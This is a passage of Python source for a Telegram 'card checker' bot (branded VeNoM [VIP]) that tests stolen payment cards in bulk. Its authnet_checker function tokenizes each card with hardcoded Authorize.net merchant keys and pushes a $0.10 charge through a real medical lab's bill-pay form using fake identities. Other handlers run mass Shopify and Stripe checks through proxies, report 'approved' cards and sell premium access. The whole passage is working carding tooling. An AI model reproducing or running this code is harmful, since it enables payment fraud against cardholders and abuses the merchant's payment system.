            price = f"${price_val:.2f}"
        except:
            price = '$0.00'
    
    # تنظيف الرد
    response_msg = result.get('message', '')
    if len(response_msg) > 30:
        response_msg = response_msg[:30]
    
    text = f"""{status_emoji} {status_text} {status_emoji}
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗖𝗖 ⌁ {result['card']}
[⚡] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⌁ {response_msg}
[⚡] 𝗚𝗮𝘁𝗲 ⌁ {gateway_display} — {price}
[⚡] 𝗧𝗶𝗺𝗲 ⌁ {current_time}
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗕𝗶𝗻 ⌁ {brand} - {bin_type} - {level}
[⚡] 𝗕𝗮𝗻𝗸 ⌁ {bank}
[⚡] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country} {flag}
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 💎 VeNoM [VIP] 👤"""
    
    try:
        await bot.send_message(user_id, premium_emoji(text), parse_mode='html')
    except:
        pass

async def send_final_results_async(user_id, results, status_msg):
    total = results['total']
    approved = len(results['approved'])
    declined = len(results['declined'])
    errors = len(results['errors'])
    text = f"""✅ Check Complete!
Results:
   ├─ Approved: {approved}
   ├─ Declined: {declined}
   ├─ Errors: {errors}
   └─ Total: {total}"""
    if approved > 0:
        text += "\n\n--- Approved Cards ---\n"
        for r in results['approved'][:10]:
            gateway_display = r.get('gateway', 'Shopify')
            if 'Stripe Auth' in gateway_display or 'stripe auth' in gateway_display.lower():
                gateway_display = 'Stripe Auth'
            text += f"✅ {r['card']} [{gateway_display}]\n"
        if approved > 10:
            text += f"... and {approved - 10} more"
    text += '\n\n💡 @blackyahlw | @E3_DB | @P4_FN | @zniir'
    try:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(text), parse_mode='html')
    except:
        await bot.send_message(user_id, premium_emoji(text), parse_mode='html')

async def send_final_results_telethon_async(user_id, results, event):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    charged_count = len(results.get('charged', []))
    approved_count = len(results.get('approved', []))
    declined_count = len(results.get('declined', []))
    errors_count = len(results.get('errors', []))
    total = results['total']
    hits_text = ""
    all_hits = results.get('charged', []) + results.get('approved', [])
    if all_hits:
        for r in all_hits[:5]:
            gateway = r.get('gateway', 'Shopify')
            if 'Stripe Auth' in gateway or 'stripe auth' in gateway.lower():
                gateway = 'Shopify'
            hits_text += f" ✅ {r['card']} [{gateway}] - {r.get('price', '$0.00')}\n"
    if not hits_text:
        hits_text = "No hits found"
    summary = f"""✅ Check Complete!
Results:
   ├─ Charged: {charged_count}
   ├─ Approved: {approved_count}
   ├─ Declined: {declined_count}
   ├─ Errors: {errors_count}
   └─ Total: {total}
Hits:
{hits_text}
Time: {hours:02d}:{minutes:02d}:{seconds:02d}
💡 @blackyahlw | @E3_DB | @P4_FN | @zniir"""
    try:
        await event.edit(premium_emoji(summary), parse_mode='html')
    except:
        await bot.send_message(user_id, premium_emoji(summary), parse_mode='html')

# ==================== دوال Authorize.net ====================

def authnet_checker(card_string):
    import requests
    import json
    import uuid
    import time
    from user_agent import generate_user_agent
    start_time = time.time()
    card_string = card_string.strip()
    try:
        parts = card_string.split('|')
        if len(parts) != 4:
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': 'Invalid format',
                'time': 0,
                'price': '$0.00'
            }
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        import random
        from faker import Faker
        fake = Faker()
        name = fake.name()
        email = fake.email()
        phone = fake.phone_number()
        address = fake.street_address()
        city = fake.city()
        state = fake.state_abbr()
        zip_code = fake.zipcode()
        session = requests.Session()
        user_agent = generate_user_agent()
        headers_get = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        }
        response = session.get('https://avanticmedicallab.com/pay-bill-online/', headers=headers_get, timeout=30)
        token_match = re.search(r'name="wpforms\[token\]" value="([^"]+)"', response.text)
        wpforms_token = token_match.group(1) if token_match else 'ccf1f214e6ae1c99c9bf26c60650bd7f'
        headers_auth = {
            'Accept': '*/*',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/json; charset=UTF-8',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/',
            'User-Agent': user_agent,
        }
        random_id = f"{random.randint(10000000,99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}"
        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '3c5Q9QdJW',
                    'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': random_id,
                    'token': {
                        'cardNumber': str(cc),
                        'expirationDate': f'{mm}{yy[-2:]}',
                        'cardCode': str(cvv),
                    },
                },
            },
        }
        response_auth = session.post(
            'https://api2.authorize.net/xml/v1/request.api',
            headers=headers_auth,
            json=json_data,
            timeout=30
        )
        if response_auth.status_code != 200:
            elapsed = time.time() - start_time
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': f'HTTP {response_auth.status_code}',
                'time': elapsed,
                'price': '$0.00'
            }
        try:
            auth_data = response_auth.json()
        except:
            content = response_auth.content.decode('utf-8-sig')
            auth_data = json.loads(content)
        if 'opaqueData' not in auth_data:
            error_msg = auth_data.get('messages', {}).get('message', [{}])[0].get('text', 'Unknown error')
            elapsed = time.time() - start_time
            if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                return {
                    'card': card_string,
                    'status': 'DECLINED',
                    'message': error_msg[:100],
                    'time': elapsed,
                    'price': '$0.00'
                }
            return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': error_msg[:100],
                    'time': elapsed,
                    'price': '$0.00'
                }
        data_descriptor = auth_data['opaqueData']['dataDescriptor']
        data_value = auth_data['opaqueData']['dataValue']
        headers_submit = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Origin': 'https://avanticmedicallab.com',
            'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
            'User-Agent': user_agent,
            'X-Requested-With': 'XMLHttpRequest',
        }
        files = {
            'wpforms[fields][1][first]': (None, name.split()[0] if ' ' in name else name),
            'wpforms[fields][1][last]': (None, name.split()[-1] if ' ' in name else name),
            'wpforms[fields][17]': (None, '0.10'),
            'wpforms[fields][2]': (None, email),
            'wpforms[fields][3]': (None, phone),
            'wpforms[fields][14]': (None, ''),
            'wpforms[fields][4][address1]': (None, address),
            'wpforms[fields][4][city]': (None, city),
            'wpforms[fields][4][state]': (None, state),
            'wpforms[fields][4][postal]': (None, zip_code),
            'wpforms[fields][6]': (None, '$ 0.10'),
            'wpforms[fields][11][]': (None, 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.'),
            'wpforms[id]': (None, '4449'),
            'wpforms[author]': (None, '1'),
            'wpforms[post_id]': (None, '3388'),
            'wpforms[authorize_net][opaque_data][descriptor]': (None, data_descriptor),
            'wpforms[authorize_net][opaque_data][value]': (None, data_value),
            'wpforms[authorize_net][card_data][expire]': (None, f'{mm}/{yy[-2:]}'),
            'wpforms[token]': (None, wpforms_token),
            'action': (None, 'wpforms_submit'),
            'page_url': (None, 'https://avanticmedicallab.com/pay-bill-online/'),
            'page_title': (None, 'Pay Bill Online'),
            'page_id': (None, '3388'),
        }
        response_submit = session.post(
            'https://avanticmedicallab.com/wp-admin/admin-ajax.php',
            cookies=session.cookies,
            headers=headers_submit,
            files=files,
            timeout=30
        )
        elapsed = time.time() - start_time
        try:
            result_data = response_submit.json()
            if result_data.get('success') == True:
                return {
                    'card': card_string,
                    'status': 'APPROVED',
                    'message': 'Payment successful',
                    'time': elapsed,
                    'price': '$0.10'
                }
            else:
                error_msg = result_data.get('data', {}).get('error', 'Transaction declined')
                if 'declined' in error_msg.lower() or 'invalid' in error_msg.lower():
                    return {
                        'card': card_string,
                        'status': 'DECLINED',
                        'message': error_msg[:100],
                        'time': elapsed,
                        'price': '$0.00'
                    }
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': error_msg[:100],
                    'time': elapsed,
                    'price': '$0.00'
                }
        except:
            response_text = response_submit.text
            if 'success' in response_text.lower() or 'thank you' in response_text.lower():
                return {
                    'card': card_string,
                    'status': 'APPROVED',
                    'message': 'Payment successful',
                    'time': elapsed,
                    'price': '$0.10'
                }
            elif 'declined' in response_text.lower() or 'error' in response_text.lower():
                return {
                    'card': card_string,
                    'status': 'DECLINED',
                    'message': response_text[:100],
                    'time': elapsed,
                    'price': '$0.00'
                }
            else:
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': response_text[:100],
                    'time': elapsed,
                    'price': '$0.00'
                }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            'card': card_string,
            'status': 'ERROR',
            'message': str(e)[:60],
            'time': elapsed,
            'price': '$0.00'
        }

async def send_authnet_approved_card_async(user_id, result):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_time = datetime.now().strftime('%H:%M:%S')
    
    text = f"""✅ APPROVED ✅
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗖𝗖 ⌁ {result['card']}
[⚡] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⌁ {result['message'][:30]}
[⚡] 𝗚𝗮𝘁𝗲 ⌁ Authorize.Net — $0.10
[⚡] 𝗧𝗶𝗺𝗲 ⌁ {current_time}
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗕𝗶𝗻 ⌁ {brand} - {bin_type} - {level}
[⚡] 𝗕𝗮𝗻𝗸 ⌁ {bank}
[⚡] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country} {flag}
─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─
[⚡] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 💎 VeNoM [VIP] 👤"""
    
    try:
        await bot.send_message(user_id, premium_emoji(text), parse_mode='html')
    except:
        pass

async def send_authnet_final_results_async(user_id, results, status_msg):
    total = results['total']
    approved = len(results['approved'])
    declined = len(results['declined'])
    errors = len(results['errors'])
    text = f"""✅ Check Complete! (Authorize.Net)
Results:
   ├─ Approved: {approved}
   ├─ Declined: {declined}
   ├─ Errors: {errors}
   └─ Total: {total}"""
    if approved > 0:
        text += "\n\n--- Approved Cards ---\n"
        for r in results['approved'][:10]:
            text += f"✅ {r['card']} [Authorize.Net]\n"
        if approved > 10:
            text += f"... and {approved - 10} more"
    text += '\n\n💡 @blackyahlw | @E3_DB | @P4_FN | @zniir'
    try:
        await bot.edit_message(user_id, status_msg.id, premium_emoji(text), parse_mode='html')
    except:
        await bot.send_message(user_id, premium_emoji(text), parse_mode='html')

# ==================== دالة test_proxy ====================

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        test_urls = [
            'http://httpbin.org/ip',
            'http://ip-api.com/json',
            'http://ipinfo.io/ip'
        ]
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            for url in test_urls:
                try:
                    async with session.get(url, proxy=proxy_url) as res:
                        if res.status == 200:
                            try:
                                data = await res.text()
                                if data:
                                    return {'proxy': proxy, 'status': 'alive', 'ip': data.strip()}
                            except:
                                pass
                            return {'proxy': proxy, 'status': 'alive'}
                except:
                    continue
            return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def test_site_with_price(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site:
            return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
        
        if not site.startswith('http'):
            site = f'https://{site}'
        
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        
        timeout = aiohttp.ClientTimeout(total=15, connect=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
        
        if raw is None:
            return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
        
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        currency = raw.get('Currency', 'USD')
        
        price_value = get_price_from_response(raw)
        
        if is_site_dead(response_msg, gateway, price_value):
            return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': currency, 'gateway': gateway}
        else:
            return {'site': site, 'status': 'alive', 'price': price_value, 'currency': currency, 'gateway': gateway}
            
    except asyncio.TimeoutError:
        return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}
    except Exception as e:
        print(f"Error testing {site}: {e}")
        return {'site': site, 'status': 'dead', 'price': 0.0, 'currency': 'USD', 'gateway': 'Unknown'}

# ==================== كولباك الأزرار ====================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    data = event.data.decode()
    
    if data.startswith("price_fltr:"):
        parts = data.split(":")
        filter_index = int(parts[1])
        filter_user_id = int(parts[2])
        if event.sender_id != filter_user_id:
            await event.answer("Not your file!", alert=True)
            return
        user_proxies = load_user_proxies(filter_user_id)
        if not user_proxies:
            await event.edit(premium_emoji("❌ Nσ ρɾσxιεs ιη yσυɾ Ɩιsт!\n\n📝 Usε /αddρɾσxy τσ αdd ρɾσxιεs."), parse_mode='html')
            return
        if filter_user_id not in TEMP_FILE_DATA:
            await event.edit(premium_emoji("❌ FιƖε dαтα εxριɾεd! PƖεαsε υρƖσαd αgαιη."), parse_mode='html')
            return
        filters = load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        if filter_index < 0 or filter_index >= len(gateway_filters):
            await event.edit(premium_emoji("❌ IηvαƖιd ғιƖтεr!"), parse_mode='html')
            return
        selected_filter = gateway_filters[filter_index]
        file_data = TEMP_FILE_DATA.pop(filter_user_id)
        cards = file_data['cards']
        sites_data = load_sites_with_price()
        if not sites_data:
            await event.edit(premium_emoji("❌ Nσ sιтεs ƒσυnd ωιтᏂ ρɾιcεs!"), parse_mode='html')
            return
        if not selected_filter.get('all', False):
            filtered_sites = [s['url'] for s in sites_data if selected_filter['min'] <= s.get('price', 0) < selected_filter['max']]
        else:
            filtered_sites = [s['url'] for s in sites_data]
        if not filtered_sites:
            await event.edit(premium_emoji(f"❌ Nσ sιтεs ƒσυnd ιη rαηgε {selected_filter['name']}!"), parse_mode='html')
            return
        active_scans[filter_user_id] = {'stop_flag': False}
        await event.edit(premium_emoji(f"🚀 Sтαɾтιηg cнεcκ ωιтᏂ ғιƖтεr: {selected_filter['name']}\n\n📠 Sιтεs: {len(filtered_sites)}\n💳 Cαɾds: {len(cards)}\n🔌 Yσυɾ Pɾσxιεs: {len(user_proxies)}"), parse_mode='html')
        asyncio.create_task(mass_check_shopify_500(filter_user_id, cards, filtered_sites, event))
        await event.answer("✅ Sсаη sтαɾтεd!")
        return
    elif data == "cancel_filter":
        user_id = event.sender_id
        if user_id in TEMP_FILE_DATA:
            TEMP_FILE_DATA.pop(user_id)
        await event.edit(premium_emoji("❌ CαηcεƖƖεd."), parse_mode='html')
        await event.answer("✅ CαηcεƖƖεd")
        return
    elif data == "show_cmds":
        text = """📋 Usεɾ Cσммαndѕ
🛒 SнσριƒƖ
├─ <code>/cc cαɾd|мм|уу|cvv</code> → Cнεcκ sιηgƖε cαɾd
└─ <code>/chk</code> → Mαss cнεcκ ƒɾσм .тxт ғιƖε
🔑 Kεy Sysтεм
└─ <code>/redeem Kεy</code> → Rεdεεм ρɾεмιυм kεy
💳 Sтɾιρe Cнεcκεɾ
├─ <code>/sst cαɾd|мм|уу|cvv</code> → Cнεcκ sιηgƖε cαɾd
└─ <code>/mst</code> → Cнεcκ cσмвσ ƒɾσм .тxт ғιƖε
💳 Aυтнσɾιzε.Nεт Cнεcκεɾ
├─ <code>/ath cαrd|мм|уу|cvv</code> → Cнεcκ sιηgƖε cαɾd
└─ <code>/mth</code> → Cнεcκ cσмвσ ƒɾσм .тxт ғιƖε
🔌 Pɾσxy Mαηαgεмεηт
├─ <code>/addproxy</code> 
│  └─ A∂∂ ρɾσxιεs тσ yσυɾ Ɩιsт
├─ <code>/proxy</code> 
│  └─ Cнεcκ & cƖεαη yσυɾ ρɾσxιεs
├─ <code>/chkproxy ρɾσxy</code> 
│  └─ Cнεcκ sιηgƖε ρɾσxy
├─ <code>/rmproxy ρɾσxy</code> 
│  └─ Rεмσvε ρɾσxy ƒɾσм yσυɾ Ɩιsт
├─ <code>/rmproxyindex 1,2,3</code> 
│  └─ Rεмσvε ву ιηdεx
├─ <code>/clearproxy</code> 
│  └─ CƖεαɾ αƖƖ yσυɾ ρɾσxιεs
└─ <code>/getproxy</code> 
   └─ DσwnƖσαd yσυɾ ρɾσxιεs
🛠 Oтнεr
├─ <code>/stopmyscan</code> → Sтσρ yσυr αcтιvε scαη
└─ <code>/activescans</code> → Vιεω αƖƖ αcтιvε scαηs (A∂мιη OηƖу)"""
        buttons = [[Button.inline("🔙 Bαcκ", b"main_menu", style="danger")]]
        await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')
        await event.answer()
    elif data == "tools_menu":
        text = """🛠️ TσσƖs Mεηυ
📂 FιƖe Mαηαgεмεηт
├─ <code>/split</code> → SρƖιт cαɾds ιηтσ ραrтs
├─ <code>/merge</code> → Mεrgε мυƖтιρƖε ғιƖεs
├─ <code>/collect</code> → CσƖƖεcт cαɾds ƒɾσм мεssαgεs
└─ <code>/clean</code> → CƖεαη εxριɾεd cαɾds
🔍 Lσσkυρ TσσƖs
├─ <code>/bin</code> → BIN Iηƒσɾмαтιση
├─ <code>/sk</code> → Sтɾιρe Kεy cнεcκ
├─ <code>/scg</code> → Sιтε scαηηεr
├─ <code>/ip</code> → IP Ɩσσkυρ
├─ <code>/fake</code> → Fαkε dαтα gεηεrαтσr
└─ <code>/iban</code> → IBAN vαƖιdαтσr"""
        buttons = [[Button.inline("🔙 Bαcκ", b"main_menu", style="danger")]]
        await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')
        await event.answer()
    elif data == "admin_panel":
        if user_id not in ADMIN_ID:
            await event.answer("❌ Accεss Dεnιεd", alert=True)
            return
        text = """🔧 A∂мιη PαηεƖ
⭐ Pɾεмιυм Mαηαgεмεηт
├─ <code>/addpremium usεr_id</code> → A∂∂ ρɾεмιυм υsεr
├─ <code>/removepremium usεr_id</code> → Rεмσvε ρɾεмιυм υsεr
├─ <code>/listpremium</code> → Lιsт ρɾεмιυм υsεrs
└─ <code>/genkeys αмσυηт нσυrs usεr_Ɩιмιт</code> → Gεηεrαтε kεys
🌐 Sιтεs Mαηαgεмεηт
├─ <code>/addsites</code> → A∂∂ sιтεs ƒɾσм .тxт ғιƖε
├─ <code>/site</code> → Cнεcκ & rεмσvε dεαd sιтεs
├─ <code>/rm urƖ</code> → Rεмσvε sρεcιғιc sιтε
├─ <code>/getsites</code> → DσwnƖσαd cυrrεηт sιтεs
├─ <code>/setfilter gαтεωαу мιη-мαx "ηαмε"</code> → A∂∂ ғιƖтεr
├─ <code>/listfilters</code> → Lιsт αƖƖ ғιƖтεrs
└─ <code>/removefilter gαтεωαу ηυмbεr</code> → Rεмσvε ғιƖтεr
🔌 Pɾσxy Mαηαgεмεηт
├─ <code>/proxy</code> → Cнεcκ & cƖεαη ρɾσxιεs
├─ <code>/addproxy</code> → A∂∂ ρɾσxιεs
├─ <code>/chkproxy ρɾσxy</code> → Cнεcκ sιηgƖε ρɾσxy
├─ <code>/rmproxy ρɾσxy</code> → Rεмσvε ρɾσxy
├─ <code>/rmproxyindex 1,2,3</code> → Rεмσvε ву ιηdεx
├─ <code>/clearproxy</code> → CƖεαr αƖƖ ρɾσxιεs
└─ <code>/getproxy</code> → DσwnƖσαd ρɾσxιεs
📊 Bσт Sтαтs
└─ <code>/stats</code> → Sнσω bσт sтαтιsтιcs
📢 Hιтs CнαηηεƖ
├─ <code>/sethits cнαηηεƖ_id</code> → Sεт нιтs cнαηηεƖ
└─ <code>/hits</code> → TσggƖε нιтs ση/σғғ
📢 Bɾσαdcαsт
├─ <code>/broadcast</code> → Bɾσαdcαsт тσ αƖƖ υsεrs
└─ <code>/broadcasthelp</code> → HεƖρ ғσr bɾσαdcαsт
🔨 Bαη Mαηαgεмεηт
├─ <code>/ban usεr_id</code> → Bαη α υsεr
├─ <code>/unban usεr_id</code> → Uηbαη α υsεr
└─ <code>/listbanned</code> → Lιsт bαηηεd υsεrs
📠 Scan Management
├─ <code>/activescans</code> → View all active scans
├─ <code>/stopscan SCAN_ID</code> → Stop specific scan
└─ <code>/stopallscans</code> → Stop all scans
⚡ Workers
└─ <code>/workers</code> → Show workers status"""
        buttons = [[Button.inline("🔙 Bαcκ", b"main_menu", style="danger")]]
        await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')
        await event.answer()
    elif data == "main_menu":
        username = event.sender.username if event.sender.username else "User"
        is_prem = is_premium(user_id)
        plan = "🟩 Pɾεмιυм" if is_prem else "🆓 Fɾεε"
        welcome_text = f"""────────────────────
► 👋 Hεу  · @{username}
► ρƖαη  · {plan}
► SнσριƒƖ
────────────────────
One day I will be the best 
💡 Bσт Dεv <a href="https://t.me/P4_FN">Fᴀʀ³ᴏɴ</a> | <a href="https://t.me/E3_DB">Dᴀᴋᴋᴀ</a> | <a href="https://t.me/blackyahlw">Bʟᴀᴄᴋ</a> | <a href="https://t.me/zniir">Dᴀᴍᴀ</a>
 Vεrsιση -»4.0 🚀
────────────────────"""
        buttons = get_main_menu_keyboard(user_id)
        await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
        await event.answer()
    elif data.startswith("buy_premium:"):
        plan = data.split(":")[1]
        if is_premium(user_id):
            await event.answer("❌ Yσυ αƖɾεα∂у нαvε ρɾεмιυм!", alert=True)
            return
        if plan == "hour":
            stars = 10
            title = "1 Hᴏᴜʀ"
        elif plan == "day":
            stars = 30
            title = "1 Dᴀʏ"
        elif plan == "week":
            stars = 100
            title = "1 Wᴇᴇᴋ"
        else:
            await event.answer("❌ IηvαƖιd ρƖαη!", alert=True)
            return
        me = await bot.get_me()
        bot_username = me.username if me.username else "bot"
        payment_link = f"https://t.me/{bot_username}?start=pay_{plan}_{user_id}"
        buttons = [
            [Button.url(f"💳 Pαу {stars} ⭐", payment_link)],
            [Button.inline("🔙 Bαcκ", b"main_menu", style="danger")]
        ]
        await event.edit(
            premium_emoji(f"""💳 <b>Bυу Pɾεмιυм - {title}</b>
💰 Pɾιcε: {stars} ⭐
📌 CƖιcκ тнε bυттση bεƖσω тσ pαу"""),
            buttons=buttons,
            parse_mode='html'
        )
        await event.answer(f"✅ {title} - {stars} ⭐", alert=True)
    elif data.startswith("split_size:"):
        parts = data.split(":")
        chunk_size = int(parts[1])
        split_user_id = int(parts[2])
        if event.sender_id != split_user_id:
            await event.answer("❌ Nσт yσυɾ ғιƖε!", alert=True)
            return
        if split_user_id not in TEMP_FILE_DATA:
            await event.edit(premium_emoji("❌ FιƖε dαтα εxριɾεd!"), parse_mode='html')
            return
        file_data = TEMP_FILE_DATA.pop(split_user_id)
        cards = file_data['cards']
        await event.edit(premium_emoji(f"🔄 SρƖιттιηg {len(cards)} cαɾds ιηтσ {chunk_size} cαɾds ρεr ғιƖε..."), parse_mode='html')
        chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
        for i, chunk in enumerate(chunks, 1):
            filename = f"cards_part_{i}_of_{len(chunks)}.txt"
            with open(filename, 'w') as f:
                for card in chunk:
                    f.write(f"{card}\n")
            await bot.send_file(user_id, filename, caption=premium_emoji(f"📄 Pαɾт {i}/{len(chunks)}\n💳 Cαɾds: {len(chunk)}"), parse_mode='html')
            os.remove(filename)
            await asyncio.sleep(1)
        await event.edit(premium_emoji(f"✅ SρƖιт CσмρƖεтεd!\n📠 TσταƖ: {len(cards)} cαɾds\n📁 FιƖεs: {len(chunks)}\n📄 Cαɾds ρεr ғιƖε: {chunk_size}"), parse_mode='html')
    elif data.startswith("split_custom:"):
        split_user_id = int(data.split(":")[1])
        if event.sender_id != split_user_id:
            await event.answer("❌ Nσт yσυɾ ғιƖε!", alert=True)
            return
        if split_user_id not in TEMP_FILE_DATA:
            await event.edit(premium_emoji("❌ FιƖε dαтα εxριɾεd!"), parse_mode='html')
            return
        await event.edit(premium_emoji("📝 Sεηd тнε ηυмbεr σғ cαɾds ρεr ғιƖε (10-15000):"), parse_mode='html')
        @bot.on(events.NewMessage(func=lambda e: e.sender_id == split_user_id and e.text and e.text.isdigit()))
        async def get_custom_size(msg_event):
            try:
                chunk_size = int(msg_event.text.strip())
                if chunk_size < 10:
                    await msg_event.reply(premium_emoji("❌ Mιηιмυм 10 cαɾds ρεr ғιƖε!"), parse_mode='html')
                    return
                if chunk_size > 15000:
                    await msg_event.reply(premium_emoji("❌ Mαxιмυм 15000 cαɾds ρεr ғιƖε!"), parse_mode='html')
                    return
                if split_user_id not in TEMP_FILE_DATA:
                    await msg_event.reply(premium_emoji("❌ FιƖε dαтα εxριɾεd!"), parse_mode='html')
                    return
                file_data = TEMP_FILE_DATA.pop(split_user_id)
                cards = file_data['cards']
                status_msg = await msg_event.reply(premium_emoji(f"🔄 SρƖιттιηg {len(cards)} cαɾds ιηтσ {chunk_size} cαɾds ρεr ғιƖε..."), parse_mode='html')
                chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
                for i, chunk in enumerate(chunks, 1):
                    filename = f"cards_part_{i}_of_{len(chunks)}.txt"
                    with open(filename, 'w') as f:
                        for card in chunk:
                            f.write(f"{card}\n")
                    await bot.send_file(split_user_id, filename, caption=premium_emoji(f"📄 Pαɾт {i}/{len(chunks)}\n💳 Cαɾds: {len(chunk)}"), parse_mode='html')
                    os.remove(filename)
                    await asyncio.sleep(1)
                await bot.edit_message(split_user_id, status_msg.id, premium_emoji(f"✅ SρƖιт CσмρƖεтεd!\n📠 TσταƖ: {len(cards)} cαɾds\n📁 FιƖεs: {len(chunks)}\n📄 Cαɾds ρεr ғιƖε: {chunk_size}"), parse_mode='html')
            except Exception as e:
                await msg_event.reply(premium_emoji(f"❌ Eɾɾσɾ: {str(e)}"), parse_mode='html')
            finally:
                bot.remove_event_handler(get_custom_size)
    elif data.startswith("split_cancel:"):
        split_user_id = int(data.split(":")[1])
        if event.sender_id != split_user_id:
            await event.answer("❌ Nσт yσυɾ ғιƖε!", alert=True)
            return
        if split_user_id in TEMP_FILE_DATA:
            TEMP_FILE_DATA.pop(split_user_id)
        await event.edit(premium_emoji("❌ CαηcεƖƖεd."), parse_mode='html')
        await event.answer("✅ CαηcεƖƖεd")
    elif data == "stars_shop":
        if is_premium(user_id):
            await event.answer("❌ Yσυ αƖɾεα∂у нαvε ρɾεмιυм.", alert=True)
            return
        text = premium_emoji(
            "⭐ <b>Pɾεмιυm Sυbscɾιρтισηs</b>\n\n"
            "⏱️ 1 Hᴏᴜʀ — <b>10 ⭐</b>\n"
            "🔄 1 Dᴀʏ — <b>30 ⭐</b>\n"
            "📆 1 Wᴇᴇᴋ — <b>100 ⭐</b>\n\n"
            "💳 Cнσσsε α ρƖαη bεƖσw:"
        )
        buttons = [
            [Button.inline(" ⏱️ 1 Hᴏᴜʀ — 10 ⭐", b"buy_stars:1h", style="primary")],
            [Button.inline(" 🔄 1 Dᴀʏ — 30 ⭐", b"buy_stars:1d", style="primary")],
            [Button.inline(" 📆 1 Wᴇᴇᴋ — 100 ⭐", b"buy_stars:7d", style="success")],
            [Button.inline(" Bαcκ", b"main_menu", style="danger")]
        ]
        await event.edit(text, buttons=buttons, parse_mode="html")
        await event.answer()
    elif data.startswith("buy_stars:"):
        plan_id = data.split(":")[1]
        if is_premium(user_id):
            await event.answer("❌ Yσυ αƖɾεα∂у нαvε ρɾεмιυм.", alert=True)
            return
        plan = STARS_PRICES[plan_id]
        await event.answer("⏳ Sεηdιηg Pαумεηт...", alert=False)
        try:
            ok = await send_stars_invoice(user_id, plan_id)
            if ok:
                await event.answer("💳 Iηvσιcε sεηт.", alert=True)
            else:
                await event.answer("❌ CσυƖdη'т sεηd тнε ιηvσιcε.", alert=True)
        except Exception as e:
            print(f"Stars invoice error: {e}")
            await event.answer("❌ Pαумεηт sεɾvιcε εɾɾσɾ.", alert=True)
    elif data.startswith("stop_scan:"):
        scan_id = data.split(":", 1)[1]
        admin_id = event.sender_id
